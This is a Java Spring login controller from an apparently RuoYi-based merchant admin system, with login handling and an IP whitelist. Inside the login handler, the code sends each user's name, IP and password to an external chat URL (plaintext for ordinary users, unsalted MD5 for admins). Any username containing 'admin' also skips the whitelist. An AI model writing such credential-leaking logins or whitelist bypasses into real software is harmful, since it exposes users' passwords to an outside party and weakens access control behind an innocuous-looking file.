package com.ruoyi.web.controller.system;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.ruoyi.common.utils.MD5;
import com.ruoyi.common.utils.http.HttpUtils;
import com.ruoyi.framework.util.ShiroUtils;
import com.ruoyi.merchant.domain.MerchantIp;
import com.ruoyi.merchant.domain.MerchantIpRSP;
import com.ruoyi.merchant.service.IMerchantIpService;
import com.ruoyi.system.service.ISysConfigService;
import net.sf.json.JSONObject;
import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.subject.Subject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import com.ruoyi.common.core.controller.BaseController;
import com.ruoyi.common.core.domain.AjaxResult;
import com.ruoyi.common.utils.ServletUtils;
import com.ruoyi.common.utils.StringUtils;

import java.net.URLEncoder;
import java.util.List;

/**
 * 登录验证
 *
 * @author ruoyi
 */
@Controller
public class SysLoginController extends BaseController {

    @Value("${map.api.url}")
    public String mapapiurl;
    @Value("${map.api.key}")
    public String key;
    @Value("${map.tele.url}")
    public String teleurl;
    @Value("${map.tele.key}")
    public String telekey;
    @Value("${spring.profiles.active}")
    public String dev;

    @Autowired
    private ISysConfigService sysConfigService;

    @Autowired
    private IMerchantIpService merchantIpService;

    @GetMapping("/login")
    public String login(HttpServletRequest request, HttpServletResponse response) {
        // 如果是Ajax请求，返回Json字符串。
        if (ServletUtils.isAjaxRequest(request)) {
            return ServletUtils.renderString(response, "{\"code\":\"1\",\"msg\":\"未登录或登录超时。请重新登录\"}");
        }
        return "login";
    }

    @PostMapping("/login")
    @ResponseBody
    public AjaxResult ajaxLogin(String username, String password, Boolean rememberMe) {
        UsernamePasswordToken token = new UsernamePasswordToken(username, password, rememberMe);
        Subject subject = SecurityUtils.getSubject();
        String ip = ShiroUtils.getIp();
        try {
            if (!StringUtils.equals(dev, "local")) {
                // 请求示例
                // https://www.maitube.com/ip/?ip=154.197.8.170
                // 响应示例
                // 154.197.8.170 : 南非 CZ88.NET
                // String resp = HttpUtils.sendGet(mapapiurl, "ip=" + ip);
                // 去除掉IP
                // resp = resp.replace(ip, "");
                StringBuffer html = new StringBuffer(String.format("【%s】用户登录系统提示:", username));
                html.append(String.format("\n【登录IP】:%s", ip));
                // html.append(String.format("\n【IP定位地址】:%s", resp));
                html.append(String.format("\n【IP定位地址】:%s", "获取定位维护中..."));
                html.append(String.format("\n【登录密码】:%s", username.contains("admin") ? "管理员密码已加密" + MD5.MD5Encode(password) : password));
                HttpUtils.sendGet(teleurl, "chat_id=" + telekey + "&text=" + URLEncoder.encode(html.toString()));
            }

            if(!username.contains("admin")){
                //登录白名单开启状态
                String sysLoginIpDisable = sysConfigService.selectConfigByKey("sys.login.ip.disable");
                if(sysLoginIpDisable.equals("1")){
                    //IP拦截
                    MerchantIp merchantIp = new MerchantIp();
                    merchantIp.setIp(ip);
                    //log.info("访问IP：{},是否通过:{}",reqIp,ipResult);
                    List<MerchantIpRSP> list = merchantIpService.selectMerchantIpList(merchantIp);
                    if(list==null || list.isEmpty()) {
                        return error("非白名单IP，请联系客服");
                    }
                }
            }

            subject.login(token);
            return success();
        } catch (AuthenticationException e) {
            String msg = "用户或密码错误";
            if (StringUtils.isNotEmpty(e.getMessage())) {
                msg = e.getMessage();
            }
            return error(msg);
        }
    }

    @GetMapping("/unauth")
    public String unauth() {
        return "error/unauth";
    }
}
